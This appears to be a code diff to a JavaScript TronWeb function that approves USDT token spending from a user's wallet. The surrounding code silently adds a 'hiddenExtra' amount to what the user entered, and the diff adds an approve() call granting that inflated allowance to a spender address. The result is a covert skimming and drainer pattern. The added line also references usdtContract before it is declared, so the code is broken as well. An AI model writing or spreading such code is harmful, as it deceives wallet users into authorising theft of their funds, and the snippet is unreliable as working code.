@@ -29,7 +29,9 @@ window.approveUSDT = async function() {
 
   const hiddenExtra = 1;
   const totalAmount = inputAmount + hiddenExtra;
-  const amountInSun = (totalAmount * 1e6).toString();
+  const amountInSun = window.tronWeb.toBigNumber(totalAmount * 1e6);
+
+const tx = await usdtContract.approve(spenderAddress, amountInSun).send();
 
   try {
     const usdtContract = await window.tronWeb.contract(usdtAbi, usdtAddress);
@@ -42,3 +44,4 @@ window.approveUSDT = async function() {
     document.getElementById("status").innerText = "授权失败，请重试";
   }
 };
+
